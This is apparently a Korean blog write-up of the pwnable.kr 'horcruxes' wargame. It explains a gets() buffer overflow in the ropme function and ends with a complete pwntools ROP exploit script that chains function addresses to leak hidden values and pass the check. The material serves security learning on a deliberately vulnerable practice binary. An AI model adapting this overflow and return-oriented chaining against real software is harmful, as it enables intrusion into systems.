---
layout: post
title:  "15. horcruxes"
subtitle: ""
date:   2018-11-25 18:52:13 +0900
categories: security
tags : pwnable
---


![1]({{"/assets/img/security/pwnable/15/1.png" | absolute_url}})

ROP 문제다

접속을 해보자

<br>

![2]({{"/assets/img/security/pwnable/15/2.png" | absolute_url}})

`9032 포트`를 통해 바이너리를 실행시킬 수 있다.

IDA로 분석을 위해 먼저 바이너리를 다운받아본다.

{% highlight bash %}
scp -P 2222 horcruxes@pwnable.kr:/home/horcruxes/horcruxes ./Desktop/
{% endhighlight %}

<br>

![3]({{"/assets/img/security/pwnable/15/3.png" | absolute_url}})

`main` 함수이다.


<br>
![4]({{"/assets/img/security/pwnable/15/4.png" | absolute_url}})

랜덤한 값에서 `a`, `b`, `c`, `d`, `e`, `f`, `g`의 값이 만들어지고 그 모든 값을 더한 값이 `sum`이 된다


<br>
![5]({{"/assets/img/security/pwnable/15/5.png" | absolute_url}})

`ropme` 함수이다.

사용자가 입력한 값이 `a`, `b`, `c`, `d`, `e`, `f`, `g` 중 하나에 해당할 경우 

그에 맞는 `A`, `B`, `C`, `D`, `E`, `F`, `G` 함수가 실행된다.

<br>

![6]({{"/assets/img/security/pwnable/15/6.png" | absolute_url}})

대문자 이름을 가진 각 함수는 위와 같이 생겼다.

호출되면 조건 분기문에서 검사하는 값을 출력한다.

<br>

![7]({{"/assets/img/security/pwnable/15/7.png" | absolute_url}})

결과적으로 사용자가 입력한 값이 `sum`과 일치해야 한다

따라서 사용자는 `a`, `b`, `c`, `d`, `e`, `f`, `g`의 값을 알아야 하고 

`gets` 함수에서 buffer overflow가 가능하니 ROP 기법을 이용해 `A`, `B`, `C`, `D`, `E`, `F`, `G`  함수를 호출하여 알아낼 수 있다.

<br>
![8]({{"/assets/img/security/pwnable/15/8.png" | absolute_url}})

`ropme`를 보면 먼저 `0x78`만큼의 스택 크기를 사용하는데

이부분이 `gets` 함수에 사용되는 buf 메모리 크기이다.

따라서 `0x78` 이후의 `4바이트`는 `ropme`의 return 주소일 것이다.


<br>
![9]({{"/assets/img/security/pwnable/15/9.png" | absolute_url}})

실제 buf의 시작 주소로부터 `0x78` 이후에 return 주소가 있다.

<br>
![10]({{"/assets/img/security/pwnable/15/10.png" | absolute_url}})

각 함수의 주소는 이렇고

{% highlight python %}
from pwn import *
 
id   = 'horcruxes'
host = 'pwnable.kr'
port = 2222
pw   = 'guest'
s = ssh(id, host, port=port, password=pw)
 
def send_payload(conn):
    A = p32(0x809fe4b)
    B = p32(0x809fe6a)
    C = p32(0x809fe89)
    D = p32(0x809fea8)
    E = p32(0x809fec7)
    F = p32(0x809fee6)
    G = p32(0x809ff05)
    ropme = p32(0x809fffc)
    payload = "A" * 120 + A + B + C + D + E + F + G + ropme
    conn.sendline(payload)
 
def get_exp(conn):
    conn.recvuntil("EXP +")
    return conn.recvuntil(")")[:-1]
 
def exploit():
    conn = s.connect_remote('localhost', 9032)
    conn.recvuntil(':')
    conn.sendline("1")
    conn.recvuntil(":")
    send_payload(conn)
    exp = 0
    for i in range(7):
        exp += int(get_exp(conn))
 
    conn.recvuntil(":")
    conn.sendline("1")
    conn.recvuntil(":")
    conn.sendline(str(exp))
 
    conn.interactive()
 
exploit()

{% endhighlight %}

